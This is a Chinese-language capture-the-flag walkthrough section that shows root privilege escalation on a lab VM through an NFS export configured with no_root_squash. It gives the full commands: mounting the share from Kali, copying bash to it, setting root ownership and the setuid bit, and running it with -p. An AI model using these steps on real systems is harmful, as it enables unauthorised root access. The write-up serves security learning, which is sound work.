## flag2

  

尝试一下提权操作。  
之前扫描到2049的端口（NFS）,类似于文件服务器，这个如果存在配置不当，可以提升ROOT权限。  
参考：https://bbs.pediy.com/thread-222518.htm  
查看一下NFS的挂载点  
showmount -e localhost

  

![](../Images/3e286fc031cad12507cdd2c5e96d3240.png)

  

在kali下创建一个目录用于挂载NFS，然后挂载到本地

sudo mkdir /mnt/orcus  
sudo mount -t nfs 192.168.0.110:/tmp /mnt/orcus

  

![](../Images/8164a1f4f53b0e93c60ea17b5f23b6c6.png)

  

在靶机执行：

cp /bin/bash wroot                 

在kali上执行：  
chown root:root 文件 wroot 的拥有者设为 root群体的使用者 root  
chmod u+s文件执行时把进程的属主或组ID置为该文件的文件属主

  

sudo su  
chown root:root wroot  
chmod u+s wroot

  

![](../Images/e586066fb8dc2e308f12adb7e7f2f5f2.png)

  

最后在靶机执行：  
./wroot -p

  

![](../Images/0f5716c20a35e0a177148fb921928325.png)

  

这里使用NFS提权。造成root提权的原因是 no\_root\_squash这个参数  
no\_root\_squash：登入NFS主机，使用该共享目录时相当于该目录的拥有者，如果是root的话，那么对于这个共享的目录来说，他就具

有root的权限。

  

![](../Images/26c6c879c914dfc0e9b8c8a9d087a840.png)
